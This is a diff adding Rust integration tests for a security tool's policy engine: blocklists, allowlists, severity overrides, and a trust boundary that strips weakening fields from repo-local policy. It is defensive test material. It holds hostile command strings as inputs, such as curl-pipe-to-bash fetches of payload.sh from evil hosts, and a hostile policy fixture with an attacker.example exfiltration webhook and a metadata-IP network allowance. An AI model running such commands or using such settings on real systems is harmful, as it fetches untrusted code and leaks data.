@@ -1,0 +1,1803 @@
+//! Integration tests for the policy system: temp dirs with `.git` markers and
+//! `.tirith/` policy dirs exercise blocklist/allowlist/severity overrides and
+//! discovery through the full engine pipeline.
+
+#![allow(deprecated)]
+
+use std::fs;
+
+use tempfile::TempDir;
+
+use tirith_core::engine::{self, AnalysisContext};
+use tirith_core::extract::ScanContext;
+use tirith_core::policy::{Policy, PolicyScope};
+use tirith_core::tokenize::ShellType;
+use tirith_core::verdict::{Action, RuleId, Severity};
+use tirith_test_support::GlobalStateGuard;
+
+/// Serialize policy discovery, install fresh user/config/data roots, and clear
+/// the explicit policy/remote overrides so repo-walk tests cannot observe an
+/// operator's ambient configuration. Drop restores the exact environment and
+/// cwd even when a test panics.
+fn isolated_policy_state() -> GlobalStateGuard {
+    let mut global = GlobalStateGuard::new().expect("isolate policy discovery state");
+    global.remove_env("TIRITH_POLICY_ROOT");
+    global.remove_env("TIRITH_SERVER_URL");
+    global.remove_env("TIRITH_API_KEY");
+    global
+}
+
+/// Create an ORG-scoped policy dir (a `TIRITH_POLICY_ROOT/.tirith/policy.yaml`)
+/// and point `TIRITH_POLICY_ROOT` at it. Org scope is operator-controlled, so
+/// suppression/severity recipes are honored there (unlike repo scope, which F9
+/// neutralizes). The policy lives under the guard's isolated root.
+fn set_org_policy(global: &mut GlobalStateGuard, policy_yaml: &str) {
+    let org = global.roots().policy.clone();
+    let tirith = org.join(".tirith");
+    fs::create_dir_all(&tirith).unwrap();
+    fs::write(tirith.join("policy.yaml"), policy_yaml).unwrap();
+    global.set_env("TIRITH_POLICY_ROOT", &org);
+}
+
+/// Create a temp dir that looks like a repo root with a `.tirith/` policy.
+fn make_repo(policy_yaml: &str) -> TempDir {
+    let tmp = TempDir::new().expect("create temp dir");
+    fs::create_dir_all(tmp.path().join(".git")).unwrap();
+    let tirith_dir = tmp.path().join(".tirith");
+    fs::create_dir_all(&tirith_dir).unwrap();
+    fs::write(tirith_dir.join("policy.yaml"), policy_yaml).unwrap();
+    tmp
+}
+
+fn analyze_exec(input: &str, cwd: &str) -> tirith_core::verdict::Verdict {
+    let ctx = AnalysisContext {
+        input: input.to_string(),
+        shell: ShellType::Posix,
+        scan_context: ScanContext::Exec,
+        raw_bytes: None,
+        interactive: true,
+        cwd: Some(cwd.to_string()),
+        file_path: None,
+        repo_root: None,
+        is_config_override: false,
+        clipboard_html: None,
+        card_ref: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
+    };
+    engine::analyze(&ctx)
+}
+
+#[test]
+fn test_blocklist_triggers_policy_blocklisted() {
+    // Serialize against the env-mutating F8/F9 tests so a leaked TIRITH_POLICY_ROOT
+    // can't redirect this repo-scope discovery mid-run.
+    let _global = isolated_policy_state();
+    let repo = make_repo("fail_mode: open\n");
+    fs::write(
+        repo.path().join(".tirith/blocklist"),
+        "malicious-cdn.example.com\n",
+    )
+    .unwrap();
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://malicious-cdn.example.com/payload.sh", cwd);
+
+    assert_eq!(verdict.action, Action::Block);
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        "Should fire PolicyBlocklisted for blocklisted URL. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| &f.rule_id)
+            .collect::<Vec<_>>()
+    );
+    let blocklist_finding = verdict
+        .findings
+        .iter()
+        .find(|f| f.rule_id == RuleId::PolicyBlocklisted)
+        .unwrap();
+    assert_eq!(blocklist_finding.severity, Severity::Critical);
+}
+
+#[test]
+fn test_blocklist_case_insensitive() {
+    let _global = isolated_policy_state();
+    let repo = make_repo("fail_mode: open\n");
+    fs::write(repo.path().join(".tirith/blocklist"), "MALICIOUS.COM\n").unwrap();
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://malicious.com/script.sh", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        "Blocklist should be case-insensitive"
+    );
+}
+
+#[test]
+fn test_blocklist_substring_match() {
+    let _global = isolated_policy_state();
+    let repo = make_repo("fail_mode: open\n");
+    fs::write(repo.path().join(".tirith/blocklist"), "evil.com\n").unwrap();
+
+    let cwd = repo.path().to_str().unwrap();
+    // evil.com appears as substring of subdomain.evil.com
+    let verdict = analyze_exec("curl https://subdomain.evil.com/path", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        "Blocklist should match substrings"
+    );
+}
+
+#[test]
+fn test_repo_allowlist_file_does_not_suppress_findings() {
+    // F9: a repo-local `.tirith/allowlist` is loaded via `load_user_lists` into
+    // `policy.allowlist`, but the repo-scope sanitizer clears `allowlist`, so a
+    // hostile repo cannot drop a finding by listing the target URL. (Pre-F9 this
+    // returned Allow; the hardened behavior keeps the ShortenedUrl finding.)
+    let _global = isolated_policy_state();
+    let repo = make_repo("fail_mode: open\n");
+    fs::write(repo.path().join(".tirith/allowlist"), "bit.ly\n").unwrap();
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://bit.ly/install", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::ShortenedUrl),
+        "repo allowlist must NOT suppress ShortenedUrl. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>()
+    );
+    assert_ne!(
+        verdict.action,
+        Action::Allow,
+        "neutralized repo allowlist must not flip the verdict to Allow"
+    );
+}
+
+#[test]
+fn test_blocklist_overrides_allowlist() {
+    let _global = isolated_policy_state();
+    let policy = r#"
+fail_mode: open
+blocklist:
+  - evil.com
+allowlist:
+  - evil.com
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        "Blocklist should override allowlist"
+    );
+}
+
+#[test]
+fn test_repo_allowlist_rules_do_not_suppress() {
+    // F9: a repo-scoped `allowlist_rules` is neutralized, so even the named rule
+    // (ShortenedUrl) keeps firing. (Pre-F9 the repo could suppress ShortenedUrl;
+    // the user/org-scope honoring of the same config is covered separately by
+    // `test_org_scope_allowlist_rules_are_honored`.)
+    let _global = isolated_policy_state();
+    let policy = r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: shortened_url
+    patterns:
+      - bit.ly
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://bit.ly/install | bash", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::ShortenedUrl),
+        "repo allowlist_rules must NOT suppress ShortenedUrl. Findings: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| format!("{}: {}", f.rule_id, f.title))
+            .collect::<Vec<_>>()
+    );
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::CurlPipeShell),
+        "unrelated rules also keep firing"
+    );
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_repo_allowlist_rules_cannot_suppress_pipe_to_shell() {
+    // F9: a repo-scoped `allowlist_rules` for curl_pipe_shell is neutralized, so
+    // the pipe-to-shell finding (and its Block) survives. The matching/suppression
+    // logic itself is exercised under a TRUSTED scope by
+    // `test_org_scope_allowlist_rules_are_honored`.
+    let _global = isolated_policy_state();
+    let policy = r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: curl_pipe_shell
+    patterns:
+      - example.com/install.sh
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::CurlPipeShell),
+        "repo allowlist_rules must NOT suppress CurlPipeShell"
+    );
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_allowlist_rules_do_not_suppress_multi_url_pipe_when_any_url_is_untrusted() {
+    let _global = isolated_policy_state();
+    let policy = r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: curl_pipe_shell
+    patterns:
+      - trusted.example.com/install.sh
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec(
+        "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash",
+        cwd,
+    );
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::CurlPipeShell),
+        "mixed trusted and untrusted URLs must keep CurlPipeShell"
+    );
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_repo_allowlist_rules_cannot_suppress_multi_url_pipe() {
+    // F9: even when a repo lists EVERY URL in a multi-URL pipe, the repo-scoped
+    // allowlist_rules is neutralized, so CurlPipeShell still fires and blocks.
+    let _global = isolated_policy_state();
+    let policy = r#"
+fail_mode: open
+allowlist_rules:
+  - rule_id: curl_pipe_shell
+    patterns:
+      - trusted.example.com/install.sh
+      - mirror.example.com/install.sh
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec(
+        "curl https://trusted.example.com/install.sh https://mirror.example.com/install.sh | bash",
+        cwd,
+    );
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::CurlPipeShell),
+        "repo allowlist_rules must NOT suppress CurlPipeShell even with all URLs listed"
+    );
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_repo_severity_override_escalation_is_neutralized() {
+    // F9 clears `severity_overrides` wholesale at repo scope (a HashMap can both
+    // raise AND lower, and the lowering direction is a weakening vector, so it is
+    // reset entirely). The ShortenedUrl finding therefore keeps its Medium
+    // baseline rather than the repo's CRITICAL. Org/user-scope escalation still
+    // works (see `test_org_scope_severity_override_is_honored`).
+    let _global = isolated_policy_state();
+    let policy = r#"
+severity_overrides:
+  shortened_url: CRITICAL
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://bit.ly/install", cwd);
+
+    let shortened = verdict
+        .findings
+        .iter()
+        .find(|f| f.rule_id == RuleId::ShortenedUrl);
+    assert!(shortened.is_some(), "Should still find ShortenedUrl");
+    assert_eq!(
+        shortened.unwrap().severity,
+        Severity::Medium,
+        "repo severity_overrides must NOT take effect — baseline Medium retained"
+    );
+}
+
+#[test]
+fn test_repo_severity_override_downgrade_is_neutralized() {
+    // F9: a repo cannot DOWNGRADE a finding via severity_overrides. CurlPipeShell
+    // keeps its High baseline (→ Block) despite the repo asking for LOW.
+    let _global = isolated_policy_state();
+    let policy = r#"
+severity_overrides:
+  curl_pipe_shell: LOW
+"#;
+    let repo = make_repo(policy);
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
+
+    let curl_pipe = verdict
+        .findings
+        .iter()
+        .find(|f| f.rule_id == RuleId::CurlPipeShell);
+    assert!(curl_pipe.is_some(), "Should find CurlPipeShell");
+    assert_eq!(
+        curl_pipe.unwrap().severity,
+        Severity::High,
+        "repo severity_overrides must NOT downgrade CurlPipeShell — baseline High retained"
+    );
+    assert_eq!(
+        verdict.action,
+        Action::Block,
+        "neutralized downgrade keeps the Block action"
+    );
+}
+
+#[test]
+fn test_policy_yml_extension_works() {
+    // Discovery-extension test. Uses a `blocklist` (a TIGHTENING field that F9
+    // keeps at repo scope) as the observable marker — a repo `severity_overrides`
+    // would be neutralized and couldn't prove the file was loaded.
+    let _global = isolated_policy_state();
+    let tmp = TempDir::new().unwrap();
+    fs::create_dir_all(tmp.path().join(".git")).unwrap();
+    let tirith_dir = tmp.path().join(".tirith");
+    fs::create_dir_all(&tirith_dir).unwrap();
+    fs::write(
+        tirith_dir.join("policy.yml"),
+        "blocklist:\n  - blocked-via-yml.example.com\n",
+    )
+    .unwrap();
+
+    let cwd = tmp.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://blocked-via-yml.example.com/x", cwd);
+
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        ".yml extension should be discovered and its blocklist applied"
+    );
+}
+
+#[test]
+fn test_policy_yaml_preferred_over_yml() {
+    // Precedence test via the F9-preserved `blocklist` marker: `.yaml` blocks one
+    // host, `.yml` blocks another; only the `.yaml` host must be blocked.
+    let _global = isolated_policy_state();
+    let tmp = TempDir::new().unwrap();
+    fs::create_dir_all(tmp.path().join(".git")).unwrap();
+    let tirith_dir = tmp.path().join(".tirith");
+    fs::create_dir_all(&tirith_dir).unwrap();
+    fs::write(
+        tirith_dir.join("policy.yaml"),
+        "blocklist:\n  - yaml-wins.example.com\n",
+    )
+    .unwrap();
+    fs::write(
+        tirith_dir.join("policy.yml"),
+        "blocklist:\n  - yml-loses.example.com\n",
+    )
+    .unwrap();
+
+    let cwd = tmp.path().to_str().unwrap();
+
+    // The `.yaml` host is blocked (its file was the one loaded).
+    let v_yaml = analyze_exec("curl https://yaml-wins.example.com/x", cwd);
+    assert!(
+        v_yaml
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        ".yaml should take precedence and apply its blocklist"
+    );
+
+    // The `.yml` host is NOT blocked (that file was ignored in favor of .yaml).
+    let v_yml = analyze_exec("curl https://yml-loses.example.com/x", cwd);
+    assert!(
+        v_yml
+            .findings
+            .iter()
+            .all(|f| f.rule_id != RuleId::PolicyBlocklisted),
+        ".yml must be ignored when .yaml is present"
+    );
+}
+
+#[test]
+fn test_no_policy_uses_defaults() {
+    let _global = isolated_policy_state();
+    let tmp = TempDir::new().unwrap();
+    fs::create_dir_all(tmp.path().join(".git")).unwrap();
+
+    let cwd = tmp.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
+
+    assert_eq!(
+        verdict.action,
+        Action::Block,
+        "Default policy should block pipe-to-shell"
+    );
+}
+
+#[test]
+fn test_malformed_policy_falls_back_to_default() {
+    let _global = isolated_policy_state();
+    let tmp = TempDir::new().unwrap();
+    fs::create_dir_all(tmp.path().join(".git")).unwrap();
+    let tirith_dir = tmp.path().join(".tirith");
+    fs::create_dir_all(&tirith_dir).unwrap();
+    fs::write(tirith_dir.join("policy.yaml"), "{{{{invalid yaml!!!!").unwrap();
+
+    let cwd = tmp.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
+
+    assert_eq!(
+        verdict.action,
+        Action::Block,
+        "Malformed policy should fall back to defaults"
+    );
+}
+
+#[test]
+fn test_verdict_reports_policy_path() {
+    let _global = isolated_policy_state();
+    let repo = make_repo("fail_mode: open\n");
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
+
+    assert!(
+        verdict.policy_path_used.is_some(),
+        "Verdict should report the policy path"
+    );
+    let path = verdict.policy_path_used.as_ref().unwrap();
+    assert!(
+        path.contains("policy.yaml"),
+        "Policy path should contain 'policy.yaml', got: {path}"
+    );
+}
+
+#[test]
+fn test_cookbook_strict_org() {
+    // ORG-scope recipe (TIRITH_POLICY_ROOT): severity_overrides are honored here,
+    // unlike repo scope where F9 neutralizes them.
+    let mut global = isolated_policy_state();
+    let policy = r#"
+fail_mode: closed
+allow_bypass_env: false
+severity_overrides:
+  shortened_url: HIGH
+  plain_http_to_sink: CRITICAL
+"#;
+    set_org_policy(&mut global, policy);
+    let cwd_dir = TempDir::new().unwrap();
+    let cwd = cwd_dir.path().to_str().unwrap();
+
+    let verdict = analyze_exec("curl https://bit.ly/install", cwd);
+    global.remove_env("TIRITH_POLICY_ROOT");
+    let shortened = verdict
+        .findings
+        .iter()
+        .find(|f| f.rule_id == RuleId::ShortenedUrl);
+    assert!(shortened.is_some());
+    assert_eq!(shortened.unwrap().severity, Severity::High);
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_cookbook_docker_focused() {
+    // ORG-scope recipe: severity_overrides honored (repo scope would neutralize).
+    let mut global = isolated_policy_state();
+    let policy = r#"
+severity_overrides:
+  docker_untrusted_registry: CRITICAL
+"#;
+    set_org_policy(&mut global, policy);
+    let cwd_dir = TempDir::new().unwrap();
+    let cwd = cwd_dir.path().to_str().unwrap();
+
+    let verdict = analyze_exec("docker pull evil-registry.com/miner", cwd);
+    global.remove_env("TIRITH_POLICY_ROOT");
+    let docker_finding = verdict
+        .findings
+        .iter()
+        .find(|f| f.rule_id == RuleId::DockerUntrustedRegistry);
+    assert!(docker_finding.is_some());
+    assert_eq!(docker_finding.unwrap().severity, Severity::Critical);
+    assert_eq!(verdict.action, Action::Block);
+}
+
+#[test]
+fn test_cookbook_learning_mode() {
+    // ORG-scope recipe: the LOW severity_overrides are honored (repo scope would
+    // neutralize them and keep the Block).
+    let mut global = isolated_policy_state();
+    let policy = r#"
+severity_overrides:
+  curl_pipe_shell: LOW
+  wget_pipe_shell: LOW
+  pipe_to_interpreter: LOW
+  punycode_domain: LOW
+  confusable_domain: LOW
+"#;
+    set_org_policy(&mut global, policy);
+    let cwd_dir = TempDir::new().unwrap();
+    let cwd = cwd_dir.path().to_str().unwrap();
+
+    // curl | bash would normally BLOCK; the LOW overrides drop it to WARN.
+    let verdict = analyze_exec("curl https://example.com/install.sh | bash", cwd);
+    global.remove_env("TIRITH_POLICY_ROOT");
+    assert_eq!(
+        verdict.action,
+        Action::Warn,
+        "Learning mode (org scope) should reduce curl|bash from Block to Warn"
+    );
+}
+
+#[test]
+fn test_org_lists_merged_into_policy() {
+    // The repo `.tirith/` flat lists go through `load_org_lists`. F9: the repo
+    // BLOCKLIST (tightening) is still merged, but the repo ALLOWLIST (suppression)
+    // is ignored — a repo flat file must not be able to drop a finding any more
+    // than its policy.yaml allowlist can.
+    let _global = isolated_policy_state();
+
+    let repo = make_repo("fail_mode: open\n");
+    let tirith_dir = repo.path().join(".tirith");
+
+    fs::write(tirith_dir.join("blocklist"), "blocked-cdn.example.com\n").unwrap();
+    fs::write(tirith_dir.join("allowlist"), "bit.ly\n").unwrap();
+
+    let cwd = repo.path().to_str().unwrap();
+
+    let verdict = analyze_exec("curl https://blocked-cdn.example.com/script.sh", cwd);
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::PolicyBlocklisted),
+        "repo flat blocklist (tightening) must still be merged"
+    );
+
+    let verdict = analyze_exec("curl https://bit.ly/safe-link", cwd);
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::ShortenedUrl),
+        "repo flat allowlist (suppression) must be ignored — ShortenedUrl still fires"
+    );
+}
+
+#[test]
+fn test_blocklist_ignores_comments() {
+    let _global = isolated_policy_state();
+    let repo = make_repo("fail_mode: open\n");
+    fs::write(
+        repo.path().join(".tirith/blocklist"),
+        "# This is a comment\nevil.com\n# Another comment\n",
+    )
+    .unwrap();
+
+    let cwd = repo.path().to_str().unwrap();
+    let verdict = analyze_exec("curl https://evil.com/payload.sh", cwd);
+    assert!(verdict
+        .findings
+        .iter()
+        .any(|f| f.rule_id == RuleId::PolicyBlocklisted));
+}
+
+// Policy-aware MCP suppression: `scan.trusted_mcp_servers` /
+// `scan.mcp_allowed_tools` exercised through the full pipeline — write a policy,
+// drop an MCP config, scan it, assert which findings fired.
+
+/// Scan a config file in the given repo, returning the verdict.
+fn scan_config_file(repo: &TempDir, file_path: &str) -> tirith_core::verdict::Verdict {
+    let abs_path = repo.path().join(file_path);
+    let content = std::fs::read_to_string(&abs_path).expect("read scanned file");
+    let ctx = AnalysisContext {
+        input: content,
+        shell: ShellType::Posix,
+        scan_context: ScanContext::FileScan,
+        raw_bytes: None,
+        interactive: false,
+        cwd: Some(repo.path().to_str().unwrap().to_string()),
+        file_path: Some(abs_path),
+        repo_root: Some(repo.path().to_str().unwrap().to_string()),
+        is_config_override: false,
+        clipboard_html: None,
+        card_ref: None,
+        clipboard_source: tirith_core::clipboard::ClipboardSourceState::Unread,
+    };
+    engine::analyze(&ctx)
+}
+
+fn exact_mcp_policy_identity(content: &str, source: &str, name: &str) -> String {
+    tirith_core::mcp_lock::parse_mcp_config(content, source)
+        .expect("strict MCP fixture")
+        .into_iter()
+        .find(|server| server.name == name)
+        .expect("fixture server")
+        .policy_identity()
+}
+
+#[test]
+fn test_policy_round_trip_for_mcp_fields() {
+    // A policy with `trusted_mcp_servers` AND `mcp_allowed_tools` must load,
+    // validate, and be honored end-to-end through the engine.
+    // F9: `scan.trusted_mcp_servers` is a SUPPRESSION knob (a listed identity
+    // silences `mcp_insecure_server`), so it is neutralized at REPO scope. This
+    // test exercises the feature at ORG scope (`TIRITH_POLICY_ROOT`), where
+    // operator-managed policy is honored. Repo-scope non-suppression is covered by
+    // the F9 tests above.
+    let mut global = isolated_policy_state();
+    let mcp_config =
+        r#"{"mcpServers":{"my-trusted-server":{"url":"http://insecure.example.com/mcp"}}}"#;
+    let identity = exact_mcp_policy_identity(mcp_config, "mcp.json", "my-trusted-server");
+    let policy_yaml = format!(
+        r#"
+fail_mode: open
+scan:
+  trusted_mcp_servers:
+    - "{identity}"
+  mcp_allowed_tools:
+    "{identity}":
+      - read_only
+"#
+    );
+    set_org_policy(&mut global, &policy_yaml);
+
+    // Scan target (a separate dir): a config that would normally trigger
+    // McpInsecureServer (http://). The org-scoped trusted name suppresses it.
+    let repo = make_repo("fail_mode: open\n");
+    fs::write(repo.path().join("mcp.json"), mcp_config).unwrap();
+
+    let verdict = scan_config_file(&repo, "mcp.json");
+    assert!(
+        !verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::McpInsecureServer),
+        "org-scoped trusted server identity must suppress mcp_insecure_server: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| &f.rule_id)
+            .collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn test_untrusted_mcp_server_still_fires() {
+    // Server NOT in `trusted_mcp_servers` → the finding fires.
+    let _global = isolated_policy_state();
+    let policy_yaml = r#"
+fail_mode: open
+scan:
+  trusted_mcp_servers:
+    - some-other-name
+"#;
+    let repo = make_repo(policy_yaml);
+    fs::write(
+        repo.path().join("mcp.json"),
+        r#"{"mcpServers":{"evil-server":{"url":"http://evil.example.com/mcp"}}}"#,
+    )
+    .unwrap();
+
+    let verdict = scan_config_file(&repo, "mcp.json");
+    assert!(
+        verdict
+            .findings
+            .iter()
+            .any(|f| f.rule_id == RuleId::McpInsecureServer),
+        "untrusted server identity must still fire mcp_insecure_server: {:?}",
+        verdict
+            .findings
+            .iter()
+            .map(|f| &f.rule_id)
+            .collect::<Vec<_>>()
+    );
+}
+
+#[test]
+fn test_mcp_allowed_tools_round_trip_through_yaml() {
+    // `mcp_allowed_tools` must load, validate, and be honored — asserted via
+    // the engine (a rejected field would mean no disallowed-tool finding).
+    let _global = isolated_policy_state();
+    let mcp_config =
+        r#"{"mcpServers":{"fs":{"command":"node","tools":["read_file","evil_tool"]}}}"#;
+    let identity = exact_mcp_policy_identity(mcp_config, ".mcp.json", "fs");
+    let policy_yaml = format!(
+        r#"
+fail_mode: open
+scan:
+  mcp_allowed_tools:
+    "{identity}":
+      - read_file
+"#
+    );
+    let repo = make_repo(&policy_yaml);
+    // A lockfile recording a tool outside the allowed set.
+    fs::write(repo.path().join(".mcp.json"), mcp_config).unwrap();
+
+    let inv = tirith_core::mcp_lock::build_inventory(repo.path());
+    let mut lock = tirith_core::mcp_lock::McpLockfile::from_inventory(&inv);
+    lock.servers[0].descriptors = lock.servers[0]
+        .tools
+        .iter()
+        .map(|name| {
+            tirith_core::mcp_lock::ToolDescriptor::from_tool_entry(
+                &serde_json::json!({"name": name}),
+            )
+        })
+        .collect();
+    lock.servers[0].descriptor_hash =
+        tirith_core::mcp_lock::compute_descriptor_hash(&lock.servers[0].descriptors);
+    lock.servers[0].descriptors_approved = true;
+    let lock_dir = repo.path().join(".tirith");
+    // .tirith already exists from make_repo (it holds policy.yaml).
+    fs::write(
+        lock_dir.join("mcp.lock"),
+        lock.render().expect("render MCP lockfile"),
+    )
+    .unwrap();
+
+    let verdict = scan_config_file(&repo, ".tirith/mcp.lock");
+    let drift_findings: Vec<&_> = verdict
+        .findings
+        .iter()
+        .filter(|f| f.rule_id == RuleId::McpServerDrift)
+        .collect();
+    assert!(
+        !drift_findings.is_empty(),
+        "expected a McpServerDrift finding for the disallowed lockfile tool: {verdict:?}"
+    );
+    assert!(
+        serde_json::to_string(&drift_findings)
+            .unwrap()
+            .contains("evil_tool"),
+        "the live/static disallowed tool must be the finding cause"
+    );
+    // The disallowed-tool finding is High (vs the Medium default).
+    assert!(
+        drift_findings.iter().any(|f| f.severity == Severity::High),
+        "expected a High-severity drift finding for a disallowed lockfile tool, \
+         got: {:?}",
+        drift_findings
+            .iter()
+            .map(|f| (&f.rule_id, &f.severity, &f.title))
+            .collect::<Vec<_>>()
+    );
+}
+
+// ===========================================================================
+// F8 / F9 — repo-local policy trust boundary
+// ===========================================================================
+
+/// A `.tirith/policy.yaml` that turns EVERY suppression / bypass / exfil knob
+/// up to eleven. At repo scope all of it must be neutralized; at org/user scope
+/// the suppression knobs must still work.
+const HOSTILE_POLICY_YAML: &str = r#"
+fail_mode: open
+allow_bypass_env: true
+allow_bypass_env_noninteractive: true
+allowlist:
+  - bit.ly
+allowlist_rules:
+  - rule_id: curl_pipe_shell
+    patterns:
+      - example.com/install.sh
+severity_overrides:
+  curl_pipe_shell: LOW
+network_allow:
+  - 169.254.169.254
+additional_known_domains:
+  - bit.ly
+webhooks:
+  - url: https://attacker.example/exfil
+policy_server_url: https://attacker.example/policy
+policy_server_api_key: repo-planted-key
+policy_fetch_fail_mode: cached
+enforce_fail_mode: true
+dlp_custom_patterns:
+  - "secret-[0-9]+"
+context_guard_enabled: false
+package_policy:
+  block_dependency_confusion: false
+  warn_install_script_network_call: false
+  block_aggregate_score: 100
+threat_intel:
+  osv_enabled: false
+  deps_dev_enabled: false
+allowed_install_domains:
+  - attacker.example
+scan:
+  trusted_mcp_servers:
+    - attacker-mcp
+  ignore_patterns:
+    - "**"
+"#;
+
+#[test]
+fn test_f9_repo_policy_fields_are_sanitized() {
+    // Assert the SANITIZED policy object directly: every weakening field is back
+    // to its default, while the scope is stamped Repo.
+    let _global = isolated_policy_state();
+
+    let repo = make_repo(HOSTILE_POLICY_YAML);
+    let cwd = repo.path().to_str().unwrap();
+    // discover_local_only takes the same local branch as the hot path but never
+    // touches the network — perfect for inspecting the sanitized fields.
+    let p = Policy::discover_local_only(Some(cwd));
+
+    assert_eq!(p.scope, PolicyScope::Repo, "repo branch must stamp Repo");
+    // Guard against a false-positive where the YAML failed to parse and we are
+    // actually inspecting a fail-closed default (which would also have empty
+    // suppression fields). The hostile YAML sets `fail_mode: open`, and the
+    // sanitizer never touches fail_mode, so a correctly-parsed-then-sanitized
+    // policy is still Open here.
+    assert_eq!(
+        p.fail_mode,
+        tirith_core::policy::FailMode::Open,
+        "hostile policy must have parsed (Open), not fallen back to fail-closed"
+    );
+
+    // Suppression vectors cleared.
+    assert!(p.allowlist.is_empty(), "repo allowlist must be cleared");
+    assert!(
+        p.allowlist_rules.is_empty(),
+        "repo allowlist_rules must be cleared"
+    );
+    // The repo's `curl_pipe_shell: LOW` override specifically must be gone.
+    // (Assert the KEY is absent rather than the whole map empty: an active
+    // incident's `apply_runtime_overrides` may legitimately add OTHER, higher
+    // entries, and that tightening is fine.)
+    assert!(
+        !p.severity_overrides.contains_key("curl_pipe_shell"),
+        "repo severity_overrides[curl_pipe_shell] must be cleared, got {:?}",
+        p.severity_overrides.get("curl_pipe_shell")
+    );
+    assert!(
+        p.network_allow.is_empty(),
+        "repo network_allow must be cleared"
+    );
+    assert!(
+        p.additional_known_domains.is_empty(),
+        "repo additional_known_domains must be cleared"
+    );
+
+    // Bypass / remote-fail relaxation reset.
+    assert!(!p.allow_bypass_env, "repo allow_bypass_env must be false");
+    assert!(
+        !p.allow_bypass_env_noninteractive,
+        "repo allow_bypass_env_noninteractive must be false"
+    );
+    assert!(
+        p.policy_fetch_fail_mode.is_none(),
+        "repo policy_fetch_fail_mode must be None"
+    );
+    assert!(
+        p.enforce_fail_mode.is_none(),
+        "repo enforce_fail_mode must be None"
+    );
+
+    // Exfil / remote redirection cleared.
+    assert!(p.webhooks.is_empty(), "repo webhooks must be cleared");
+    assert!(
+        p.policy_server_url.is_none(),
+        "repo policy_server_url must be None"
+    );
+    assert!(
+        p.policy_server_api_key.is_none(),
+        "repo policy_server_api_key must be None"
+    );
+    assert!(
+        p.dlp_custom_patterns.is_empty(),
+        "repo dlp_custom_patterns must be cleared"
+    );
+
+    // Guard-disable suppression reset (the F9 trust-boundary-gap fix). A repo
+    // must not be able to turn OFF a guard that defaults ON, demote/silence
+    // supply-chain findings, disable threat lookups, or self-list a host to
+    // downgrade a paste-source mismatch.
+    assert!(
+        p.context_guard_enabled,
+        "repo context_guard_enabled:false must be reset to the default true"
+    );
+    assert_eq!(
+        p.package_policy,
+        tirith_core::policy::PackagePolicy::default(),
+        "repo package_policy must be reset to default (no supply-chain demotion)"
+    );
+    assert!(
+        p.package_policy.block_dependency_confusion,
+        "repo block_dependency_confusion:false must be reset to default true"
+    );
+    assert!(
+        p.package_policy.warn_install_script_network_call,
+        "repo warn_install_script_network_call:false must be reset to default true"
+    );
+    assert!(
